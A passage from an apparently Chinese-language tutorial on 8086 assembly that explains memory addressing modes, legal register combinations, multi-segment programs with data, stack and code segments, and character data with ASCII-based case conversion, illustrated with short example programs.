</span>mov al<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">; (al) = ((ds) * 16 + 0)，将内存单元的数据送入 al  </span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span> <span class="token comment">; (al) = ((ds) * 16 + bx)，将内存单元的数据送入 al  </span>mov al<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span> <span class="token comment">; 与 mov al, [bx] 含义相同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>如果直接使用 <code>[idata]</code> 来表示偏移地址，那么 <code>[idata]</code> 前必须要显式给出段地址所在的段寄存器，例如：<code>mov al, ds:[idata]</code><br>否则，编译器会将 <code>mov al, [idata]</code> 解释为 <code>mov al, idata</code>，只是表示一个常数，而不是偏移地址</li><li>如果使用寄存器 <code>[bx]</code> 来表示偏移地址，则段地址默认在 DS 中，可以显式给出段地址所在的段寄存器，也可以不给出，例如：<code>mov al, [bx]</code></li></ol></blockquote><hr><h2 id="BX-idata"><a href="#BX-idata" class="headerlink" title="[BX + idata]"></a>[BX + idata]</h2><blockquote><p>除了使用 <code>[BX]</code> 以外，还可以更灵活地使用 <code>[BX + idata]</code> 来表示一个内存单元，它的偏移地址为 <code>(BX) + idata</code>，即：<em>BX 中的数据加上 idata</em></p><p><strong>段地址默认在 DS 中</strong></p></blockquote><ul><li><p>例如，指令 <code>mov ax, [bx + 200]</code> 表示将一个段地址在 DS 且偏移地址为 BX 中的数据加上 200 的地址处的两字节数据内容送入 AX。除此之外，该指令还可以写为：<br>① <code>mov ax, [200 + bx]</code><br>② <code>mov ax, 200[bx]</code><br>③ <code>mov ax, [bx] . 200</code></p></li><li><p>示例如下：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token number">2000</span>:<span class="token number">1000</span>     BE  <span class="token number">00</span>  <span class="token number">06</span>  <span class="token number">00</span>  6A  <span class="token number">22</span>mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> 1000hmov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; ax = 00BEh</span>mov cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment">; cx = 0600h</span>add cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>   <span class="token comment">; cx = 0600h + 0006h = 0606h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="BX-SI-和-BX-DI"><a href="#BX-SI-和-BX-DI" class="headerlink" title="[BX + SI] 和 [BX + DI]"></a>[BX + SI] 和 [BX + DI]</h2><blockquote><p>除了 <code>[BX]</code> 和 <code>[BX + idata]</code> 以外，还可以配合 SI 和 DI 实现更为灵活的方式：<code>[BX + SI]</code> 和 <code>[BX + DI]</code></p></blockquote><ul><li><p>例如，指令 <code>mov ax, [bx + si]</code> 表示将一个段地址在 DS 且偏移地址为 BX 中的数据加上 SI 中的数据的地址处的两字节数据内容送入 AX。除此之外，该指令还可以写为：<code>mov ax, [bx][si]</code></p></li><li><p>示例如下：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token number">2000</span>:<span class="token number">1000</span>     BE  <span class="token number">00</span>  <span class="token number">06</span>  <span class="token number">00</span>  6A  <span class="token number">22</span>mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> 1000hmov si<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> si<span class="token punctuation">]</span>   <span class="token comment">; ax = 00BEh</span>inc simov cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> si<span class="token punctuation">]</span>   <span class="token comment">; cx = 0600h</span>inc simov di<span class="token punctuation">,</span> siadd cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> di<span class="token punctuation">]</span>   <span class="token comment">; cx = 0600h + 0006h = 0606h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="BX-SI-idata-和-BX-DI-idata"><a href="#BX-SI-idata-和-BX-DI-idata" class="headerlink" title="[BX + SI + idata] 和 [BX + DI + idata]"></a>[BX + SI + idata] 和 [BX + DI + idata]</h2><blockquote><p>与上面的其他方式类似，不再赘述</p></blockquote><ul><li><p>例如，指令 <code>mov ax, [bx + si + idata]</code> 还可以写为：<br>① <code>mov ax, [bx + 200 + si]</code><br>② <code>mov ax, [200 + bx + si]</code><br>③ <code>mov ax, 200[bx][si]</code><br>④ <code>mov ax, [bx] . 200[si]</code><br>⑤ <code>mov ax, [bx][si] . 200</code></p></li><li><p>示例如下：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token number">2000</span>:<span class="token number">1000</span>     BE  <span class="token number">00</span>  <span class="token number">06</span>  <span class="token number">00</span>  6A  <span class="token number">22</span>mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> 1000hmov si<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> si<span class="token punctuation">]</span>   <span class="token comment">; ax = 0006h</span>inc simov cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> si<span class="token punctuation">]</span>   <span class="token comment">; cx = 6A00h</span>inc simov di<span class="token punctuation">,</span> siadd cx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> di<span class="token punctuation">]</span>   <span class="token comment">; cx = 6A00h + 226Ah = 8C6Ah</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="操作数寻址方式"><a href="#操作数寻址方式" class="headerlink" title="操作数寻址方式"></a>操作数寻址方式</h1><blockquote><p>总结一下各种定位内存地址的方法，这些不同的方法也可以称为寻址方式</p><p>注意：在 8086CPU 中，<strong>只有 BX、SI、DI、BP 这四个寄存器可以用在 [···] 中进行内存单元的寻址</strong>，且<strong>只有 BX 与 SI、BX 与 DI、BP 与 SI、BP 与 DI 四种组合</strong>，即：<mark>BX 与 BP、SI 与 DI 的组合是不合法的</mark></p><p>例如，以下指令都是正确的：<br><code>mov ax, [bx]</code><br><code>mov ax, [bx + si]</code><br><code>mov ax, [bx + di]</code><br><code>mov ax, [bp]</code><br><code>mov ax, [bp + si]</code><br><code>mov ax, [bp + di]</code><br><code>mov ax, [si]</code><br><code>mov ax, [di]</code><br>以下指令都是错误的：<br><code>mov ax, [cx]</code><br><code>mov ax, [ax]</code><br><code>mov ax, [dx]</code><br><code>mov ax, [ds]</code><br><code>mov ax, [bx + bp]</code><br><code>mov ax, [si + di]</code></p><p>如果使用 BX 寄存器，段地址默认在 DS 中；如果使用 BP 寄存器，段地址默认在 SS 中</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F1.png" alt="x86汇编_寻址方式1.png"></p><hr><h2 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h2><blockquote><p><strong>操作数就在指令中（紧跟在操作码之后）</strong>。<mark>立即数只能作为源操作数，并且长度要与目的操作数（寄存器）的长度一致</mark></p><p>操作数作为指令的一部分存放在代码段里，当机器从内存取指令到 CPU 时，操作数就连同一起被取走，当 CPU 执行这条指令时就可以立即得到操作数，而不用再到内存中去取，因此称为立即寻址</p></blockquote><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 6h   <span class="token comment">; 执行指令后 al = 06h</span>mov ax<span class="token punctuation">,</span> 12AFh   <span class="token comment">; 执行指令后 ax = 12AFh，其中 ah = 12h，al = AFh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h2><blockquote><p><strong>操作数是寄存器中存放的值</strong>。在指令中给出寄存器名，对于 16 位操作数可以是：AX、BX、CX、DX、SI、DI、SP、BP 等，对于 8 位操作数可以是：AH、AL、BH、BL、CH、CL、DH、DL</p><p><em>由于寄存器寻址中，操作数在 CPU 内部的寄存器中，指令在执行时不需要访问内存，因此执行速度更快</em>（与立即寻址不同的是，立即数是指令的一部分，而寄存器寻址中的操作数在 CPU 内部的寄存器中）</p></blockquote><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> bl   <span class="token comment">; 执行指令后 al = bl，bl 不变</span>mov ax<span class="token punctuation">,</span> bx   <span class="token comment">; 执行指令后 ax = bx，bx 不变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h2><blockquote><p><strong>指令中直接给出操作数的偏移地址</strong>。指令中直接给出了操作数的偏移地址，当指令被取到 CPU 执行时，CPU 就可以马上从指令中获取偏移地址。</p><p><mark>如果指令中没有使用段前缀指明操作数的段地址，则默认为 DS 寄存器，CPU 会根据段地址和偏移地址计算出物理地址，再从物理地址中取出操作数</mark></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token number">2000</span>:<span class="token number">4045</span>     BE  <span class="token number">00</span>  <span class="token number">06</span>  <span class="token number">00</span>  6A  <span class="token number">22</span>mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>4050h<span class="token punctuation">]</span>   <span class="token comment">; 执行指令后 al = BEh（一字节）</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>4050h<span class="token punctuation">]</span>   <span class="token comment">; 执行指令后 ax = 00BEh（两字节）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h2><blockquote><p><strong>操作数的偏移地址存放在寄存器中</strong>。与寄存器寻址不同，寄存器间接寻址不是将寄存器中的内容直接作为操作数，而是将寄存器中的内容作为偏移地址，<em>操作数存放在内存中</em>。</p><p><mark>寄存器间接寻址只支持 BX、BP、SI、DI</mark>（BX、SI、DI 默认 DS 作为段地址，BP 默认 SS 作为段地址）</p><p>可以用寄存器间接指向一个内存单元，寄存器的值不同，指向的内存单元地址就不同，常用于循环</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 默认 DS 寄存器作为段地址</span>mov dx<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp<span class="token punctuation">]</span>   <span class="token comment">; 默认 SS 寄存器作为段地址</span>mov es:<span class="token punctuation">[</span>di<span class="token punctuation">]</span><span class="token punctuation">,</span> ax   <span class="token comment">; 指定 ES 寄存器作为段地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="寄存器相对寻址"><a href="#寄存器相对寻址" class="headerlink" title="寄存器相对寻址"></a>寄存器相对寻址</h2><blockquote><p><strong>操作数的偏移地址是一个寄存器和位移量之和</strong>。与寄存器间接寻址不同，偏移地址的构成除了寄存器以外，还要加上位移量</p><p><mark>寄存器相对寻址只支持 BX、BP、SI、DI</mark>（BX、SI、DI 默认 DS 作为段地址，BP 默认 SS 作为段地址）</p><p><u>特别适用于访问一维数组，寄存器可以作为数组的下标，利用修改寄存器的值来定位数组中的元素</u></p></blockquote><ul><li>例如，以下三条指令是等效的：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> arry<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>arry<span class="token punctuation">]</span><span class="token punctuation">[</span>bx<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>arry <span class="token operator">+</span> bx<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，位移量 <code>arry</code> 通常是 16 位（与 16 位寄存器匹配）的变量（也可以是常量），操作数的偏移地址由 <code>arry</code> 的偏移地址加上 bx 的值构成</p><ul><li>例如，在如下指令中，<code>buf</code> 是一个 8 位（与 8 位寄存器匹配）的变量（也可以是常量）：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> buf<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesg<span class="token punctuation">,</span> ds:datasegdataseg <span class="token instruction keyword">SEGMENT</span>    arry db 1Ah<span class="token punctuation">,</span> 2Bh<span class="token punctuation">,</span> 3Ch<span class="token punctuation">,</span> 4Fh<span class="token punctuation">,</span> 5Eh<span class="token punctuation">,</span> 6Dhdataseg <span class="token instruction keyword">ENDS</span>codesg <span class="token instruction keyword">SEGMENT</span>start:    mov ax<span class="token punctuation">,</span> dataseg    mov ds<span class="token punctuation">,</span> ax<span class="token comment">; 以下写法都是等效的</span>mov dl<span class="token punctuation">,</span> arry<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">; dl = 1Ah</span>    mov dl<span class="token punctuation">,</span> <span class="token punctuation">[</span>arry<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment">; dl = 2Bh</span>    mov dl<span class="token punctuation">,</span> <span class="token punctuation">[</span>arry <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>   <span class="token comment">; dl = 3Ch</span>    mov dl<span class="token punctuation">,</span> <span class="token punctuation">[</span>arry<span class="token punctuation">]</span><span class="token number">.3</span>   <span class="token comment">; dl = 4Fh</span>    mov dl<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">[</span>arry<span class="token punctuation">]</span>   <span class="token comment">; dl = 5Eh</span>    mov dl<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">+</span> arry<span class="token punctuation">]</span>   <span class="token comment">; dl = 6Dh</span>        mov ah<span class="token punctuation">,</span> <span class="token number">2</span>    int 21hcodesg <span class="token instruction keyword">ENDS</span><span class="token directive property">END</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h2><blockquote><p><strong>操作数的偏移地址是一个基址寄存器和一个变址寄存器的内容之和</strong>。</p><p><mark>支持的基址寄存器为：BX、BP，变址寄存器为：SI、DI</mark>（BX、SI、DI 默认 DS 作为段地址，BP 默认 SS 作为段地址）</p><p><u>这种寻址方式可用于数组的处理，将数组的首地址放在基址寄存器，修改变址寄存器，以此来定位数组中的元素</u>。由于基址寄存器和变址寄存器都可以修改，所以访问数组元素更加灵活</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">[</span>si<span class="token punctuation">]</span>   <span class="token comment">; 默认 DS 寄存器作为段地址</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp<span class="token punctuation">]</span><span class="token punctuation">[</span>di<span class="token punctuation">]</span>   <span class="token comment">; 默认 SS 寄存器作为段地址</span>mov ax<span class="token punctuation">,</span> es:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">[</span>di<span class="token punctuation">]</span>   <span class="token comment">; 指定 ES 寄存器作为段地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="相对基址变址寻址"><a href="#相对基址变址寻址" class="headerlink" title="相对基址变址寻址"></a>相对基址变址寻址</h2><blockquote><p><strong>操作数的偏移地址是一个基址寄存器和一个变址寄存器的内容以及一个位移量之和</strong>。位移量可以是一个常量，也可以是一个符号地址</p><p><mark>支持的基址寄存器为：BX、BP，变址寄存器为：SI、DI</mark>（BX、SI、DI 默认 DS 作为段地址，BP 默认 SS 作为段地址）</p><p><u>这种寻址方式可用于二维数组的处理，数组的首地址为 arry，基址寄存器指向数组的行，变址寄存器指向该行的某个元素，以此来定位数组中的元素</u>。</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> arry<span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">[</span>si<span class="token punctuation">]</span>   <span class="token comment">; 默认 DS 寄存器作为段地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" title="包含多个段的程序"></a>包含多个段的程序</h1><h2 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h2><blockquote><p>将数据定义在程序最前面，为避免编译器将数据当成指令执行，需要使用 <code>&quot;标号&quot;</code>、<code>&quot;end 标号&quot;</code> 来指明程序入口</p><p>程序框架如下：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code  code segment... 数据 ...  start:  ... 代码 ...  code ends  end start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li>示例，使用 loop 循环对 8 个字型数据进行累加：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codecode segmentdw 0123h<span class="token punctuation">,</span> 0456h<span class="token punctuation">,</span> 0789h<span class="token punctuation">,</span> 0abch<span class="token punctuation">,</span> 0defh<span class="token punctuation">,</span> 0fedh<span class="token punctuation">,</span> 0cbah<span class="token punctuation">,</span> 0987hstart:mov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>s:add ax<span class="token punctuation">,</span> cs:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>add bx<span class="token punctuation">,</span> <span class="token number">2</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>由于 <code>dw</code>（define word）定义的数据位于代码段的最开始（这里是 <code>CS:0 ~ CS:F</code>），所以需要使用 <code>&quot;end 标号&quot;</code> 来指明汇编程序的入口（这里是 <code>end start</code>），即：将 <code>start</code> 处的 <code>mov bx, 0</code> 作为程序的第一条指令，从这里开始运行程序（<strong>如果不加标号指明程序入口，编译器会将 <code>dw</code> 定义的数据也当作指令的机器码来进行翻译，导致结果错误</strong>）</p></blockquote><blockquote><p><strong><code>&quot;end 标号&quot;</code> 指明汇编程序的入口的实现原理</strong>：</p><ol><li>在编译、链接后，由 <code>end start</code> 指明的程序入口会被转化为一个入口地址，存储在可执行文件的描述信息中；</li><li>当程序被加载入内存后，加载者从可执行文件的描述信息中读到程序的入口地址，从而设置 <code>CS:IP</code> 指向该地址，CPU 就会从我们所希望的地址处开始执行</li></ol></blockquote><hr><h2 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h2><blockquote><p>使用 SS 段寄存器，将栈顶单元的偏移地址放在 SP 中（初始时指向栈底），即可将一段空间作为栈来使用</p></blockquote><ul><li>示例，使用 loop 循环配合入栈、出栈将数据逆序存放</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentdw 0123h<span class="token punctuation">,</span> 0456h<span class="token punctuation">,</span> 0789h<span class="token punctuation">,</span> 0abch<span class="token punctuation">,</span> 0defh<span class="token punctuation">,</span> 0fedh<span class="token punctuation">,</span> 0cbah<span class="token punctuation">,</span> 0987hdw <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token comment">; 用 dw 定义16个字型数据，在程序加载后，将取得16个字的内存空间</span><span class="token comment">; 在后面的程序中将这段空间当作栈来使用</span><span class="token comment">; 数据在 CS:0 ~ CS:F，栈空间在 CS:10 ~ CS:2F</span>start:mov ax<span class="token punctuation">,</span> csmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> 30h   <span class="token comment">; 初始时栈顶指针 SS:SP 指向栈底，即 CS:30</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>s:push cs:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>add bx<span class="token punctuation">,</span> <span class="token number">2</span>loop s   <span class="token comment">; 依次入栈</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>   s0:pop cs:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>add bx<span class="token punctuation">,</span> <span class="token number">2</span>loop s0   <span class="token comment">; 依次出栈</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h2><blockquote><p>在 8086CPU 中，一个段的容量不能大于 64KB，所以如果数据、栈和代码需要的空间超过 64 KB 就不能放在一个段中（这是 8086CPU 的限制，但并不是所有处理器都这样）</p></blockquote><ul><li>将上一小节的代码进行改写：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:data<span class="token punctuation">,</span> ss:stackdata segment  <span class="token comment">; 数据段</span>dw 0123h<span class="token punctuation">,</span> 0456h<span class="token punctuation">,</span> 0789h<span class="token punctuation">,</span> 0abch<span class="token punctuation">,</span> 0defh<span class="token punctuation">,</span> 0fedh<span class="token punctuation">,</span> 0cbah<span class="token punctuation">,</span> 0987hdata endsstack segment  <span class="token comment">; 栈段</span>dw <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token comment">; 用 dw 定义16个字型数据，在程序加载后，将取得16个字的内存空间</span><span class="token comment">; 在后面的程序中将这段空间当作栈来使用</span><span class="token comment">; 数据在 CS:0 ~ CS:F，栈空间在 CS:10 ~ CS:2F</span>stack endscode segment  <span class="token comment">; 代码段</span>start:mov ax<span class="token punctuation">,</span> stackmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> 20h   <span class="token comment">; 初始时栈顶指针 SS:SP 指向 stack:20，栈中共 32 字节数据，从 0 ~ 31，栈顶指针指向 32</span>mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> ax   <span class="token comment">; ds 指向 data 段</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; ds:bx 指向 data 段中的第一个单元</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>s:push <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>add bx<span class="token punctuation">,</span> <span class="token number">2</span>loop s   <span class="token comment">; data 段中的数据依次入栈</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>   s0:pop <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>add bx<span class="token punctuation">,</span> <span class="token number">2</span>loop s0   <span class="token comment">; 依次出栈到 data 段的 0~15 单元</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="数据表示和数据处理"><a href="#数据表示和数据处理" class="headerlink" title="数据表示和数据处理"></a>数据表示和数据处理</h1><h2 id="以字符形式给出数据"><a href="#以字符形式给出数据" class="headerlink" title="以字符形式给出数据"></a>以字符形式给出数据</h2><blockquote><p>在汇编程序中，可以用 ‘···’ 的方式指明数据是以字符的形式给出的，编译器将把这些字符转换为相对应的 ASCii 码</p></blockquote><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segment  <span class="token comment">; 数据段</span>db <span class="token char">'unIX'</span>db <span class="token char">'foRK'</span>data endscode segment  <span class="token comment">; 代码段</span>start:mov al<span class="token punctuation">,</span> <span class="token char">'a'</span>mov bl<span class="token punctuation">,</span> <span class="token char">'b'</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>在程序中，<code>db &#39;unIX&#39;</code> 相当于 <code>db 75h, 6Eh, 49h, 58h</code>（分别对应 <code>&#39;u&#39;</code>、<code>&#39;n&#39;</code>、<code>&#39;I&#39;</code>、<code>&#39;X&#39;</code> 的 ASCii 码），<code>db &#39;foRK&#39;</code> 相当于 <code>db 66h, 6Fh, 52h, 4Bh</code>（分别对应 <code>&#39;f&#39;</code>、<code>&#39;o&#39;</code>、<code>&#39;R&#39;</code>、<code>&#39;K&#39;</code> 的 ASCii 码）</li><li>在程序中，<code>mov al, &#39;a&#39;</code> 相当于 <code>mov al, 61h</code>（<code>&#39;a&#39;</code> 的 ASCii 码为 61h），<code>mov bl, &#39;b&#39;</code> 相当于 <code>mov bl, 62h</code>（<code>&#39;b&#39;</code> 的 ASCii 码为 62h）</li></ol><hr><h2 id="字母的大小写转换"><a href="#字母的大小写转换" class="headerlink" title="字母的大小写转换"></a>字母的大小写转换</h2><ol><li><p><strong>根据 ASCii 码来看</strong><br>大写字母与小写字母的 ASCii 码间隔 20h，即：<code>&#39;a&#39; - &#39;A&#39; = 20h</code><br>所以可以根据 ASCii 码的加减来将字母进行大小写转换<br>但是，这样必须事先判断该字母是大写还是小写，若是小写则 - 20h，若是大写则 + 20h</p></li><li><p><strong>根据二进制形式来看</strong><br>大写字母与小写字母的 ASCii 码间隔 20h，也就是 20h &#x3D; 